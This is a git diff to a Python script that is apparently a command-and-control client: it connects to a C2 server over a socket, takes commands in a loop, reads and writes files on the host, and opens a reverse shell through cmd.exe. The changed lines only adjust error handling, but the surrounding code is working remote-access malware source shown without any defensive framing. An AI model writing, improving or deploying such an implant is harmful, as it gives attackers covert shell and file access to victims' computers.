@@ -17,7 +17,7 @@ def download_data(path):
         f = open(path)
         data = f.read()
     except OSError as e:
-        return e
+        return str(e)
     return data
 
 def upload_data(data, path):
@@ -27,7 +27,7 @@ def upload_data(data, path):
         f.write(data)
         f.close()
     except OSError as e:
-        return e
+        return str(e)
     return '1'
 
 
@@ -35,8 +35,10 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
     sock.connect((HOST, PORT)) # Connect to the C2 server
     print("Connected!!!")
     while True:
-        data = json.loads(sock.recv(1024).decode())
-        print(data)
+        try:
+            data = json.loads(sock.recv(1024).decode())
+        except ConnectionResetError as e:
+            quit()
         match data[0]:
             case "shell": # Opens a reverse shell on the host to the server
                 p=subprocess.Popen(['cmd.exe'],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
